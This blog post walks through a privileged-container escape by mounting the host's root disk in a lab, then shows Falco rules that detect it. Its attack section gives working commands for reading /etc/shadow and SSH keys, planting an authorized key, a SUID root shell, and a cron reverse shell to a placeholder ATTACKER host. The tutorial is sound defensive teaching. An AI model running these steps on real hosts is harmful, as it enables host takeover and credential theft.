---
title: "Container Escapes: host device mount"
categories:
  - notes
  - container
header:
  teaser: /assets/images/posts/container/container-teaser5.jpg
  overlay_image: assets/images/posts/container/container-header4.jpg
  overlay_filter: 0.5
excerpt: "How a privileged container mounts the host's root disk directly, how Falco sees the mount, and the controls that stop it."
description: "A privileged container mounts the host root disk read-write and owns the box."
tags:
  - container
  - container-escapes
  - linux
  - security
  - offensive-security
---

# Intro

Second technique in the Container Escapes series. Same three phases as before: attack, detect, defend. Same threat model as the opener, a privileged container, and a different mechanism.

The [core_pattern post](https://johnermac.github.io/notes/container/corepattern/) abused a writable `/proc/sys` and the usermode-helper mechanism: write a file, then wait for the kernel to run it. Here the host's root filesystem lives on a block device, and `--privileged` hands that block device to the container. If you can `mount` it, you get the real host disk, read-write, no waiting and no crash needed.

Like `core_pattern`, this is not a CVE. It is a consequence of the flag, and it works on a default Docker install the moment someone adds `--privileged`.

## Threat model

The single misconfiguration is still this:

```sh
docker run --privileged ...
```

But "privileged" is a bundle, and the last post only needed one item from it. This one needs a specific set, so it is worth being exact about what has to be true for the `mount` to succeed. Five gates, all of which `--privileged` opens at once:

1. **`CAP_SYS_ADMIN` in the initial user namespace.** `mount(2)` checks the capability against the user namespace that owns the mount namespace. Without it the syscall returns `EPERM`. Docker creates no user namespace by default, so a privileged container holds the capability in the initial one, which is where a block device mount needs it.
2. **Seccomp allowing `mount`.** Docker's default profile permits `mount` for containers holding `CAP_SYS_ADMIN` and returns `EPERM` for everyone else. `--privileged` sets seccomp to `unconfined`.
3. **AppArmor allowing `mount`.** On Debian and Ubuntu the `docker-default` profile carries `deny mount,`, which rejects the syscall independently of capabilities and seccomp. `--privileged` runs the container unconfined. Hosts using SELinux have no equivalent rule for this syscall.
4. **The host block device is reachable.** Two parts: the device node has to exist in the container's `/dev` (privileged bind-mounts the host `/dev`), and the device allowlist has to permit opening it. A default container gets a short list (`null`, `zero`, `random`, a few others). `--privileged` replaces it with `a *:* rwm`, which allows every device.
5. **The filesystem driver is loaded on the host.** `ext4` here. The kernel is shared, so whatever mounts the host root is already available.

`CAP_MKNOD` is a sixth, optional one: if the device node is not already present, that capability lets you recreate it with `mknod` from the major:minor numbers.

Gates 2 and 3 are listed apart because they fail at different points. `docker run --cap-add=SYS_ADMIN` without `--privileged` satisfies the capability check and passes the seccomp filter, then stops at AppArmor.

The syscalls involved are small in number:

- `openat(2)` on `/dev/sdX`, to open the block device.
- `mount(2)`, to attach it to a directory.
- optionally `mknod(2)`, to recreate the node.
- for the quieter variant at the end, `openat(2)` plus `read(2)` straight on the device, with no `mount` at all.

<div style="margin:1.5em 0;overflow-x:auto;">
<svg viewBox="0 0 880 300" width="100%" style="max-width:880px;height:auto;display:block;margin:0 auto;font-family:-apple-system,Segoe UI,Roboto,sans-serif;" role="img" aria-label="The mount path from container to host disk. The host block device /dev/sda1 is visible in the container's /dev. Two gates stand between the container and the host filesystem: the device allowlist must permit open(), and mount() must pass CAP_SYS_ADMIN, seccomp and AppArmor. Privileged opens both, so mounting /dev/sda1 yields the live host root filesystem.">
  <defs>
    <marker id="dm-ar" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#8a929c"/></marker>
  </defs>
  <rect x="10" y="95" width="160" height="90" rx="8" fill="#21262e" stroke="#3a4048" stroke-width="1.5"/>
  <text x="90" y="126" text-anchor="middle" fill="#eaeaea" font-size="13" font-weight="600">/dev/sda1</text>
  <text x="90" y="146" text-anchor="middle" fill="#b9c0c8" font-size="11">host block device</text>
  <text x="90" y="162" text-anchor="middle" fill="#b9c0c8" font-size="11">visible in container</text>

  <rect x="255" y="95" width="170" height="90" rx="8" fill="#21262e" stroke="#99058d" stroke-width="1.5"/>
  <text x="340" y="120" text-anchor="middle" fill="#d17bd0" font-size="12.5" font-weight="700">gate 1</text>
  <text x="340" y="142" text-anchor="middle" fill="#eaeaea" font-size="12" font-family="monospace">openat()</text>
  <text x="340" y="160" text-anchor="middle" fill="#b9c0c8" font-size="10.5">device allowlist: a *:* rwm</text>

  <rect x="510" y="95" width="170" height="90" rx="8" fill="#21262e" stroke="#99058d" stroke-width="1.5"/>
  <text x="595" y="120" text-anchor="middle" fill="#d17bd0" font-size="12.5" font-weight="700">gate 2</text>
  <text x="595" y="142" text-anchor="middle" fill="#eaeaea" font-size="12" font-family="monospace">mount()</text>
  <text x="595" y="158" text-anchor="middle" fill="#b9c0c8" font-size="10.5">CAP_SYS_ADMIN + seccomp</text>
  <text x="595" y="172" text-anchor="middle" fill="#b9c0c8" font-size="10.5">+ AppArmor</text>

  <rect x="765" y="95" width="105" height="90" rx="8" fill="#3a1416" stroke="#e5484d" stroke-width="1.8"/>
  <text x="817" y="126" text-anchor="middle" fill="#ff6b70" font-size="12.5" font-weight="700">host /</text>
  <text x="817" y="146" text-anchor="middle" fill="#eaeaea" font-size="10.5">live host</text>
  <text x="817" y="161" text-anchor="middle" fill="#eaeaea" font-size="10.5">filesystem</text>

  <line x1="172" y1="140" x2="252" y2="140" stroke="#8a929c" stroke-width="1.8" marker-end="url(#dm-ar)"/>
  <line x1="427" y1="140" x2="507" y2="140" stroke="#8a929c" stroke-width="1.8" marker-end="url(#dm-ar)"/>
  <line x1="682" y1="140" x2="762" y2="140" stroke="#8a929c" stroke-width="1.8" marker-end="url(#dm-ar)"/>

  <text x="440" y="235" text-anchor="middle" fill="#8a929c" font-size="11.5">--privileged opens both gates at once</text>
  <text x="440" y="255" text-anchor="middle" fill="#8a929c" font-size="11.5">a default container has each one closed</text>
</svg>
</div>

> [!] This does not apply to a default container. A default Docker container drops `CAP_SYS_ADMIN`, which also makes the seccomp profile refuse `mount`, keeps the AppArmor profile that denies `mount`, applies a tight device allowlist, and does not expose host block devices in `/dev`. Every gate above is closed. The attack assumes the privilege was already handed over.

---

# Background: block devices, the device allowlist, and mount

## Block devices and /dev

A block device is how Linux talks to storage. Disks and partitions show up as device nodes under `/dev`: `/dev/sda` is a whole disk, `/dev/sda1` is the first partition on it. Each node is identified by a major and minor number, which is how the kernel routes reads and writes to the right driver.

The host's root filesystem lives on one of these. On the lab VM it is `/dev/sda1`. Open that device and read it and you are reading the raw bytes of the host filesystem, inode tables and all.

A normal container never sees these nodes. Its `/dev` is a small `tmpfs` with a handful of pseudo-devices. There is no `/dev/sda`, so there is nothing to open.

## The device allowlist

Even if a node existed, opening it is a second permission check. The allowlist decides which device nodes a process in the cgroup may open, keyed by type (`c` for char, `b` for block), major:minor, and access mode (`r`, `w`, `m`).

Where it lives depends on the cgroup version. Under cgroup v1 it is the `devices` controller, driven by the `devices.allow` and `devices.deny` files. Under cgroup v2 that controller was removed, and runc compiles the same rules into a `BPF_PROG_TYPE_CGROUP_DEVICE` eBPF program attached to the container's cgroup. The `a *:* rwm` syntax below is the OCI and `--device-cgroup-rule` form, which describes both.

A default Docker container gets a short list: `/dev/null`, `/dev/zero`, `/dev/random`, `/dev/urandom`, `/dev/tty`, and a few more. Host disks are not on it, so even a node you created by hand would fail to open.

`--privileged` throws the list away and installs a single rule: `a *:* rwm`. Every device, every access. Combined with the host `/dev` being bind-mounted in, every host disk is now both present and openable.

<div style="margin:1.5em 0;overflow-x:auto;">
<svg viewBox="0 0 880 330" width="100%" style="max-width:880px;height:auto;display:block;margin:0 auto;font-family:-apple-system,Segoe UI,Roboto,sans-serif;" role="img" aria-label="Device allowlist, default versus privileged. Default: a short allowlist of null, zero, random, urandom, tty. Opening a host disk is denied. Privileged: a single rule a star colon star rwm allows every device, so the host disk opens.">
  <rect x="10" y="10" width="415" height="310" rx="10" fill="#1c2027" stroke="#3a4048" stroke-width="1.5"/>
  <text x="30" y="42" fill="#eaeaea" font-size="15" font-weight="700">Default container</text>
  <text x="30" y="63" fill="#8a929c" font-size="11.5">device allowlist</text>
  <g font-family="monospace" font-size="12.5" fill="#b9c0c8">
    <text x="30" y="98">c 1:3   rwm   /dev/null</text>
    <text x="30" y="120">c 1:5   rwm   /dev/zero</text>
    <text x="30" y="142">c 1:9   rwm   /dev/urandom</text>
    <text x="30" y="164">c 5:0   rwm   /dev/tty</text>
    <text x="30" y="186">...</text>
  </g>
  <line x1="24" y1="208" x2="411" y2="208" stroke="#3a4048" stroke-width="1"/>
  <g>
    <circle cx="42" cy="248" r="9" fill="#3a1416"/><path d="M38,244 l8,8 M46,244 l-8,8" stroke="#e5484d" stroke-width="2"/>
    <text x="62" y="244" fill="#ff6b70" font-size="13" font-weight="700">open("/dev/sda1")</text>
    <text x="62" y="263" fill="#8a929c" font-size="11.5">not on the list, denied</text>
  </g>
  <text x="30" y="300" fill="#b9c0c8" font-size="11.5" font-style="italic">Host disks are unreachable.</text>

  <rect x="455" y="10" width="415" height="310" rx="10" fill="#1c2027" stroke="#99058d" stroke-width="1.8"/>
  <text x="475" y="42" fill="#eaeaea" font-size="15" font-weight="700">--privileged</text>
  <text x="475" y="63" fill="#8a929c" font-size="11.5">device allowlist</text>
  <g font-family="monospace" font-size="13.5" fill="#d17bd0">
    <text x="475" y="120" font-weight="700">a *:* rwm</text>
  </g>
  <text x="475" y="150" fill="#b9c0c8" font-size="12">every device, every access mode</text>
  <line x1="469" y1="208" x2="856" y2="208" stroke="#3a4048" stroke-width="1"/>
  <g>
    <circle cx="487" cy="248" r="9" fill="#153a1e"/><path d="M482,248 l3.5,3.5 l6-7" stroke="#46a758" stroke-width="2" fill="none"/>
    <text x="507" y="244" fill="#eaeaea" font-size="13" font-weight="700">open("/dev/sda1")</text>
    <text x="507" y="263" fill="#8a929c" font-size="11.5">allowed</text>
  </g>
  <text x="475" y="300" fill="#b9c0c8" font-size="11.5" font-style="italic">The host root disk is now openable.</text>
</svg>
</div>

## What mount has to get past

Opening the device is not enough. Attaching it to a directory is `mount(2)`, which the kernel gates on `CAP_SYS_ADMIN`. This is the single most powerful capability, and it is exactly the one `--privileged` grants.

The capability is checked against the user namespace that owns the mount namespace, and for a filesystem backed by a block device that check lands in the initial user namespace. `ext4` is not marked `FS_USERNS_MOUNT`, so no capability held inside a nested user namespace will mount it. Only `tmpfs`, `proc`, `sysfs`, `fuse` and a handful of others carry that flag. Docker without `userns-remap` leaves the container in the initial user namespace, which puts the capability where the kernel wants it.

Two more locks sit in front of the syscall. Seccomp runs first, at syscall entry, before any capability check. Docker's default profile lists `mount` under a rule conditioned on `CAP_SYS_ADMIN`, so a container holding the capability passes the filter and one without it gets `EPERM` from the filter's default action. AppArmor runs next, inside the syscall, and the `docker-default` profile rejects the call with `deny mount,` even when seccomp let it through. `--privileged` sets both to unconfined.

## Why it crosses the container boundary

The block device is the host disk itself. Mounting `/dev/sda1` gives the live filesystem the host is running from: the same `/etc`, `/root`, and `/home` the host boots with, readable and writable in real time.

The host already has that device mounted at `/`. The kernel keys superblocks by block device, so the second mount finds the existing superblock and attaches a new mount point to it. Both mounts share one superblock, one page cache, one journal. A write from inside the container reaches the host immediately, and mounting a busy root filesystem this way leaves it intact.

---

# Attack

## Lab setup

Throwaway VM, default Docker. This mounts and writes the host root disk, so do not run it on anything you care about.

{% raw %}
```sh
# confirm default docker: overlay2, default seccomp, no userns-remap
$ docker info --format '{{.Driver}} {{.SecurityOptions}}'
overlay2 [name=apparmor name=seccomp,profile=default name=cgroupns]
```
{% endraw %}

Note which device backs the host root, so we can recognize it from inside the container later:

```sh
$ findmnt -n -o SOURCE /
/dev/sda1
$ cat /etc/hostname
debian-lab
```

Start the vulnerable container:

```sh
$ docker run --rm -it --privileged ubuntu:22.04 bash
```

## Recon

First move inside an unknown container: measure how restricted you are. Only `/proc` and `/dev` are needed.

```sh
# capabilities
root@ctr:/# grep CapEff /proc/self/status
CapEff: 0000003fffffffff
```

That is every capability this Docker grants. The kernel usually defines more. `0000003fffffffff` covers bits 0 to 37, ending at `CAP_AUDIT_READ`, while the lab kernel is 5.10 and reports `cap_last_cap` 40. `CAP_PERFMON`, `CAP_BPF` and `CAP_CHECKPOINT_RESTORE` exist on it, and Docker 20.10 predates all three. A newer Docker on the same kernel gives `000001ffffffffff`.

Treat a full set as a hint. `--cap-add` produces the same bits for whatever it adds. The bit that matters here is `CAP_SYS_ADMIN`, which authorizes `mount`. Seccomp, AppArmor and the device allowlist are separate gates and have to be tested separately.

```sh
# what block devices can we see?
root@ctr:/# ls -l /dev/sda*
brw-rw---- 1 root disk 8, 0 /dev/sda
brw-rw---- 1 root disk 8, 1 /dev/sda1
brw-rw---- 1 root disk 8, 2 /dev/sda2
brw-rw---- 1 root disk 8, 5 /dev/sda5

root@ctr:/# lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
sda      8:0    0   20G  0 disk
|-sda1   8:1    0   19G  0 part /etc/hosts
|                               /etc/hostname
|                               /etc/resolv.conf
|-sda2   8:2    0    1K  0 part
`-sda5   8:5    0  975M  0 part [SWAP]
sr0     11:0    1  388M  0 rom
```

Host disks are visible, so the host `/dev` is bind-mounted in. Visibility says nothing about the allowlist, which is enforced at `open()`, so test that separately:

```sh
root@ctr:/# dd if=/dev/sda1 bs=512 count=1 status=none | wc -c
512
```

512 bytes back means the allowlist permits the device. A denied one reports `dd: failed to open '/dev/sda1': Operation not permitted`.

`lsblk` also hands us the target for free: `sda1` is mounted at `/etc/hosts`, `/etc/hostname`, and `/etc/resolv.conf`. Docker generates those three files under `/var/lib/docker/containers/<id>/` and bind-mounts them in, so the partition behind them is whichever one holds `/var/lib/docker`. Here that is the root partition, `/dev/sda1`. On a host with `/var/lib/docker` on its own disk this points at that disk instead, and the root filesystem is a different partition in the same `lsblk` output.

> [!] Inside the container, `/` is an overlay filesystem, and `findmnt /` reports `overlay`. The host disk lives elsewhere: a raw block node in `/dev`, reachable here only because `--privileged` exposed it.

## The escape

Three lines.

```sh
root@ctr:/# mkdir -p /mnt/host
root@ctr:/# mount /dev/sda1 /mnt/host
root@ctr:/# ls /mnt/host
ROOT.TXT  bin  boot  dev  etc  home  lib  lib64  ...  root  run  sbin  srv  sys  tmp  usr  var
```

`/mnt/host` is now the live host filesystem.

> [!] The mount is read-write by default. Add `-o ro` if you only mean to look.

## From disk access to host root

The mount gives two primitives, and every follow-on step is built from them: **read any file on the host, and write any file on the host.** First confirm that the mount really landed on the host:

```sh
# whose hostname is this?
root@ctr:/# cat /mnt/host/etc/hostname
debian-lab
```

The hostname comes back as `debian-lab`, the host itself. Now the two primitives.

**Read: harvest secrets.** The entire host filesystem is readable. The targets that turn into further access:

```sh
# password hashes, to crack offline
root@ctr:/# grep '^root:' /mnt/host/etc/shadow
root:$y$[... real host root hash ...]

# existing keys to reuse, and the host's own SSH host keys (impersonation material)
root@ctr:/# ls /mnt/host/root/.ssh /mnt/host/home/*/.ssh
root@ctr:/# ls /mnt/host/etc/ssh/ssh_host_*_key

# whatever this box actually holds
root@ctr:/# ls /mnt/host/root/.aws /mnt/host/etc/kubernetes 2>/dev/null
```

None of this is namespaced away, since these are the host's real `/etc`, `/root`, and `/home`.

**Write: turn the read into a session.** Writing is what moves you off the container onto the host. One file proves the primitive:

```sh
root@ctr:/# echo "escaped-from-container" > /mnt/host/root/ESCAPE_PROOF.txt
# and from the host itself:
$ cat /root/ESCAPE_PROOF.txt
escaped-from-container
```

That file could have been anything. The standard moves, all just writes to the mounted disk:

```sh
# 1. drop your key in root's authorized_keys, then log in as root
root@ctr:/# mkdir -p /mnt/host/root/.ssh
root@ctr:/# cat attacker_key.pub >> /mnt/host/root/.ssh/authorized_keys
#    then from your machine:  ssh root@host   ->  root shell on the host

# 2. a root cron job that calls back
root@ctr:/# echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' \
              >> /mnt/host/etc/cron.d/x

# 3. a SUID-root shell sitting on the host filesystem
root@ctr:/# cp /bin/bash /mnt/host/bin/rootbash && chmod 4755 /mnt/host/bin/rootbash
#    then on the host:  /bin/rootbash -p
```

`-p` on that last one is required. `bash` drops the effective UID back to the real one at startup unless it is passed, so a SUID `bash` without `-p` hands back an ordinary shell.

Or skip the file tricks and act as host root right now, with `chroot`:

```sh
root@ctr:/# chroot /mnt/host /bin/bash
root@host:/# id
uid=0(root) gid=0(root) groups=0(root)
root@host:/# hostname
debian-lab
```

`chroot /mnt/host` gives a shell whose whole filesystem is the host. From there it is an ordinary root box: read every secret, add users, install what you want.

## The quieter variant

The mount is the direct path, and it trips a `mount(2)` the moment it happens. If you only need to read the host filesystem, you can skip `mount` entirely and read the block device directly. No `mount(2)`, just `openat` and `read` on the device. This changes what a defender sees, which the Detect section gets into.

The crude version is `grep`, `dd`, or `strings` over the raw device. `grep -a` treats the device as text and matches on newline boundaries:

```sh
root@ctr:/# grep -a -o -m1 '^root:.*:0:0:' /dev/sda1
root:*:0:0:
```

`dd` streams the device into a filter, same idea:

```sh
root@ctr:/# dd if=/dev/sda1 bs=1M 2>/dev/null | grep -a -o -m1 '^root:.*:0:0:'
root:*:0:0:
```

`strings` works too, if `binutils` is present (`strings /dev/sda1 | grep ...`).

These are opportunistic. They scan the whole disk, so they are slow, they are positional (a `dd` over just the first 512M missed this file, because it sits deeper on the partition), they catch stale deleted copies sitting in free blocks, and they can miss a file that is fragmented across non-adjacent blocks.

The hit above shows the problem. A live Debian `/etc/passwd` has `root:x:0:0:`, and the `*` in that output comes from `/usr/share/base-passwd/passwd.master`, a template file that happens to match the pattern. A raw scan returns whichever copy it reaches first, with no way to tell which file it belongs to.

The clean version is to read the file through the filesystem driver without mounting. `debugfs`, part of `e2fsprogs` and already present in the `ubuntu` image, walks the ext4 structures and reads the real inode:

```sh
root@ctr:/# debugfs -c -R "cat /etc/shadow" /dev/sda1
debugfs 1.46.5 (30-Dec-2021)
/dev/sda1: catastrophic mode - not reading inode or group bitmaps
root:$y$[... real host root hash ...]:20673:0:99999:7:::
daemon:*:20673:0:99999:7:::
bin:*:20673:0:99999:7:::
sys:*:20673:0:99999:7:::
...
```

`-R` runs one command, `cat /etc/shadow`, against the device. Reading a filesystem the host has mounted and busy works because `debugfs` opens the device read-only by default. `-c` is catastrophic mode, which skips the inode and group bitmaps and shows up in the banner above. It helps on a large or damaged filesystem, and the command works without it.

The result is the complete, current `/etc/shadow` with usable hashes, pulled without a single `mount` call. `ntfscat` reads a file by path from an NTFS volume the same way. XFS has no direct equivalent: `xfs_db` is a structure debugger, so pulling a file there means walking the inode and its extents by hand.

An open of the block device is all any of this leaves behind.

The read path also stops at reading. Writing without `mount` means `debugfs -w` or raw block writes, and both edit a filesystem the running host has mounted and cached. The kernel knows nothing about those writes, so its page cache can overwrite them and the metadata can end up inconsistent.

---

# Detect

Same setup as the last post. [Falco](https://falco.org/) taps the kernel through an eBPF probe and matches syscalls against rules. The question is whether it sees this escape.

## Default rules

I ran Falco with only its stable default ruleset and repeated the attack. The `-it` shell above is convenient for exploring by hand, and the Falco rounds ran the PoC as a script instead, so the measurement covers the escape and nothing around it:

```sh
$ docker run --rm -i --privileged ubuntu:22.04 bash -s < poc.sh
```

```sh
$ grep -c '"priority"' falco-round1.json
0
```

Zero alerts.

This is the mount path only: `mount` plus the raw `grep` read, no compiler and no crash. The `core_pattern` PoC at least tripped the default rules by accident, because it compiled a crasher and default Falco flags new binaries. Here there is nothing incidental to catch.

Two details produce that zero. A piped `bash -s` has no TTY, and the stock "Terminal shell in container" rule keys on an interactive terminal, so the same commands under `docker run -it` do fire it. That alert reports a shell, and it fires just as readily on someone debugging the image, so it says nothing about the mount. The rule that names the mount, "Mount Launched in Privileged Container", ships in the incubating maturity tier, which the stable ruleset does not load.

One read variant, `debugfs`, does trip a stock rule, covered further below.

## A rule that catches the mechanism

The action that performs the escape is the `mount` of a host block device, so that is what the rule should watch. Falco exposes `evt.type = mount` and the mount arguments, so we can match the source device directly.

```yaml
- rule: Mount host block device from container
  desc: >
    A process inside a container issued mount(2) against a host block device
    (SCSI/SATA, virtio, NVMe, Xen, device-mapper, MD RAID, eMMC). In a
    privileged container this mounts the live host filesystem, giving full
    host root (T1611).
  condition: >
    evt.type = mount and evt.dir = < and container
    and (evt.arg.dev startswith "/dev/sd"
         or evt.arg.dev startswith "/dev/vd"
         or evt.arg.dev startswith "/dev/nvme"
         or evt.arg.dev startswith "/dev/xvd"
         or evt.arg.dev startswith "/dev/mapper"
         or evt.arg.dev startswith "/dev/dm-"
         or evt.arg.dev startswith "/dev/md"
         or evt.arg.dev startswith "/dev/mmcblk")
  output: >
    host block device mounted from inside a container
    (device=%evt.arg.dev dir=%evt.arg.dir fstype=%evt.arg.type
     proc=%proc.cmdline user=%user.name
     container=%container.name image=%container.image.repository:%container.image.tag)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation, T1611]
```

I paired it with a second rule for the quiet variant, matching an open of a raw block device from a container, so reading the disk with `dd` does not slip past silently.

Load the rule and run Falco:

```sh
docker run --rm -d --name falco --privileged --pid=host \
  -v /var/run/docker.sock:/host/var/run/docker.sock \
  -v /dev:/host/dev -v /proc:/host/proc:ro -v /etc:/host/etc:ro \
  -v "$PWD/devicemount_rule.yaml:/etc/falco/rules.d/devicemount.yaml:ro" \
  falcosecurity/falco:latest \
  falco -o engine.kind=modern_ebpf -o json_output=true \
        -o json_include_output_property=true -o buffered_outputs=false
```

`--pid=host` matters. Drop it and Falco runs outside the host PID namespace, logs `disabled BPF iterators (not running in the root PID namespace)`, and enriches processes and containers poorly. Syscall events still flow either way, so the rules fire regardless, and the fields in the alert are only trustworthy with the flag on.

Run the escape, then pull the alert:

```sh
$ grep '"rule":"Mount host block device from container"' <(docker logs falco)
```

Now it fires:

```json
{
    "priority": "Critical",
    "rule": "Mount host block device from container",
    "output": "host block device mounted from inside a container (device=/dev/sda1 dir=/mnt/host fstype=ext4 proc=mount /dev/sda1 /mnt/host user=root container=vigilant_jackson image=ubuntu:22.04)",
    "output_fields": {
        "evt.arg.dev": "/dev/sda1",
        "evt.arg.dir": "/mnt/host",
        "evt.arg.type": "ext4",
        "proc.cmdline": "mount /dev/sda1 /mnt/host",
        "container.name": "vigilant_jackson",
        "container.image.repository": "ubuntu",
        "container.image.tag": "22.04",
        "user.name": "root"
    },
    "source": "syscall",
    "tags": ["T1611", "container", "escape", "mitre_privilege_escalation"]
}
```

CRITICAL, on the `mount` itself, with the source device, the target directory, and the filesystem type, tagged `T1611` (Escape to Host). The second rule also fired on the block-device open, three times, once for each `open` the `mount` command and the raw read performed.

<div style="margin:1.5em 0;overflow-x:auto;">
<svg viewBox="0 0 880 210" width="100%" style="max-width:880px;height:auto;display:block;margin:0 auto;font-family:-apple-system,Segoe UI,Roboto,sans-serif;" role="img" aria-label="Falco alert card. Priority CRITICAL. Rule: Mount host block device from container. Fields: device /dev/sda1, dir /mnt/host, fstype ext4, proc mount /dev/sda1 /mnt/host, user root, container vigilant_jackson, image ubuntu 22.04. Tagged T1611.">
  <rect x="10" y="10" width="860" height="190" rx="10" fill="#1c2027" stroke="#e5484d" stroke-width="1.5"/>
  <rect x="10" y="10" width="6" height="190" rx="3" fill="#e5484d"/>
  <rect x="32" y="28" width="86" height="26" rx="13" fill="#3a1416" stroke="#e5484d" stroke-width="1.2"/>
  <text x="75" y="46" text-anchor="middle" fill="#ff6b70" font-size="12.5" font-weight="700">CRITICAL</text>
  <text x="132" y="46" fill="#eaeaea" font-size="15" font-weight="700" font-family="monospace">Mount host block device from container</text>
  <line x1="32" y1="70" x2="848" y2="70" stroke="#3a4048" stroke-width="1"/>
  <g font-size="12.5" font-family="monospace">
    <text x="32"  y="98"  fill="#8a929c">device</text>   <text x="150" y="98"  fill="#eaeaea">/dev/sda1</text>
    <text x="32"  y="122" fill="#8a929c">dir</text>      <text x="150" y="122" fill="#eaeaea">/mnt/host</text>
    <text x="32"  y="146" fill="#8a929c">fstype</text>   <text x="150" y="146" fill="#eaeaea">ext4</text>
    <text x="470" y="98"  fill="#8a929c">proc</text>     <text x="560" y="98"  fill="#eaeaea">mount /dev/sda1 /mnt/host</text>
    <text x="470" y="122" fill="#8a929c">user</text>     <text x="560" y="122" fill="#eaeaea">root</text>
    <text x="470" y="146" fill="#8a929c">image</text>    <text x="560" y="146" fill="#eaeaea">ubuntu:22.04</text>
  </g>
  <rect x="32"  y="164" width="70" height="24" rx="12" fill="#2a1230" stroke="#99058d" stroke-width="1"/>
  <text x="67"  y="181" text-anchor="middle" fill="#d17bd0" font-size="11.5" font-family="monospace">T1611</text>
  <rect x="112" y="164" width="90" height="24" rx="12" fill="#21262e" stroke="#3a4048" stroke-width="1"/>
  <text x="157" y="181" text-anchor="middle" fill="#b9c0c8" font-size="11.5" font-family="monospace">container</text>
  <rect x="212" y="164" width="70" height="24" rx="12" fill="#21262e" stroke="#3a4048" stroke-width="1"/>
  <text x="247" y="181" text-anchor="middle" fill="#b9c0c8" font-size="11.5" font-family="monospace">escape</text>
</svg>
</div>

<div style="margin:1.5em 0;overflow-x:auto;">
<svg viewBox="0 0 880 250" width="100%" style="max-width:880px;height:auto;display:block;margin:0 auto;font-family:-apple-system,Segoe UI,Roboto,sans-serif;" role="img" aria-label="Comparison. Round 1 with default rules produces zero alerts, the escape is invisible. Round 2 with the custom rule catches the mount of the host block device as CRITICAL, plus the raw block-device open.">
  <rect x="10" y="10" width="415" height="230" rx="10" fill="#1c2027" stroke="#3a4048" stroke-width="1.5"/>
  <text x="30" y="42" fill="#eaeaea" font-size="15" font-weight="700">Round 1 - default rules</text>
  <text x="30" y="63" fill="#8a929c" font-size="11.5">stable ruleset only</text>
  <g>
    <circle cx="42" cy="108" r="9" fill="#3a1416"/><path d="M38,104 l8,8 M46,104 l-8,8" stroke="#e5484d" stroke-width="2"/>
    <text x="62" y="104" fill="#ff6b70" font-size="13" font-weight="700">0 alerts</text>
    <text x="62" y="123" fill="#8a929c" font-size="11.5">the mount is invisible</text>
  </g>
  <text x="30" y="170" fill="#b9c0c8" font-size="11.5" font-style="italic">No TTY shell, no compiler, no crash.</text>
  <text x="30" y="190" fill="#b9c0c8" font-size="11.5" font-style="italic">The stock mount rule ships disabled.</text>
  <text x="30" y="215" fill="#b9c0c8" font-size="11.5" font-style="italic">The escape leaves no default trace.</text>

  <rect x="455" y="10" width="415" height="230" rx="10" fill="#1c2027" stroke="#99058d" stroke-width="1.8"/>
  <text x="475" y="42" fill="#eaeaea" font-size="15" font-weight="700">Round 2 - + custom rule</text>
  <text x="475" y="63" fill="#8a929c" font-size="11.5">watch the mount</text>
  <g>
    <circle cx="487" cy="108" r="9" fill="#3a1416"/><path d="M482,108 l3.5,3.5 l6-7" stroke="#ff6b70" stroke-width="2" fill="none"/>
    <text x="507" y="104" fill="#ff6b70" font-size="13" font-weight="700">Mount host block device</text>
    <text x="507" y="123" fill="#eaeaea" font-size="11.5">CRITICAL, device=/dev/sda1 ext4</text>
    <circle cx="487" cy="158" r="9" fill="#2a2410"/><path d="M482,158 l3.5,3.5 l6-7" stroke="#e0b341" stroke-width="2" fill="none"/>
    <text x="507" y="154" fill="#e0b341" font-size="13" font-weight="700">Open host block device</text>
    <text x="507" y="173" fill="#eaeaea" font-size="11.5">WARNING, covers dd/grep/debugfs reads</text>
  </g>
  <text x="475" y="215" fill="#b9c0c8" font-size="11.5" font-style="italic">Both tagged T1611, on the syscall.</text>
</svg>
</div>

## Catching the read-only variants

The mount rule does nothing for the quiet path, because `grep`, `dd`, and `debugfs` never call `mount`. They open the block device and read it. So the second rule watches exactly that, an open of a host block device from a container:

```yaml
- rule: Open host block device from container
  desc: >
    A process inside a container opened a raw host block device. Covers the
    read-only variants (dd, grep, debugfs) that skip mount(2) and read the
    disk directly, which still leaks the entire host filesystem (T1611).
  condition: >
    (open_write or open_read) and container
    and (fd.name startswith "/dev/sd"
         or fd.name startswith "/dev/vd"
         or fd.name startswith "/dev/nvme"
         or fd.name startswith "/dev/xvd"
         or fd.name startswith "/dev/dm-"
         or fd.name startswith "/dev/md"
         or fd.name startswith "/dev/mmcblk")
  output: >
    raw host block device opened from inside a container
    (file=%fd.name mode=%evt.arg.flags proc=%proc.cmdline user=%user.name
     container=%container.name image=%container.image.repository:%container.image.tag)
  priority: WARNING
  tags: [container, escape, mitre_privilege_escalation, T1611]
```

Running the read-only PoC (all three tools, no mount) fires it once per tool, and the `proc.cmdline` field names which one:

```sh
$ grep '"rule":"Open host block device' <(docker logs falco) \
    | grep -o '"proc.cmdline":"[^"]*"' | sort -u
"proc.cmdline":"dd if=/dev/sda1 bs=1M"
"proc.cmdline":"debugfs -c -R cat /etc/shadow /dev/sda1"
"proc.cmdline":"grep -a -o -m1 ^root:.*:0:0: /dev/sda1"
```

The `debugfs` open, for example:

```json
{
    "priority": "Warning",
    "rule": "Open host block device from container",
    "output_fields": {
        "fd.name": "/dev/sda1",
        "evt.arg.flags": "O_RDONLY",
        "proc.cmdline": "debugfs -c -R cat /etc/shadow /dev/sda1",
        "container.image.repository": "ubuntu",
        "user.name": "root"
    },
    "source": "syscall",
    "tags": ["T1611", "container", "escape", "mitre_privilege_escalation"]
}
```

There is one more result worth calling out. The default ruleset says nothing about the mount or the `dd` and `grep` reads, but it does catch `debugfs`, because it ships a dedicated rule for it:

```json
{
    "priority": "Warning",
    "rule": "Debugfs Launched in Privileged Container",
    "output_fields": {
        "proc.name": "debugfs",
        "proc.exepath": "/usr/sbin/debugfs",
        "proc.pname": "bash",
        "command": "debugfs -c -R cat /etc/shadow /dev/sda1",
        "user.name": "root"
    },
    "tags": ["T1611", "cis", "container", "maturity_stable", "mitre_privilege_escalation", "process"]
}
```

`debugfs` is an ext filesystem debugger with a well documented offensive use, and Falco ships a rule named after the binary, so the cleanest read variant is also the one default Falco is most likely to see. That rule keys on the process name, which any renamed or statically linked copy defeats. The `dd` and `grep` reads, and the `mount` itself, are only caught once you add the two rules above. Watching the device access covers all four paths at once, whatever tool does the reading.

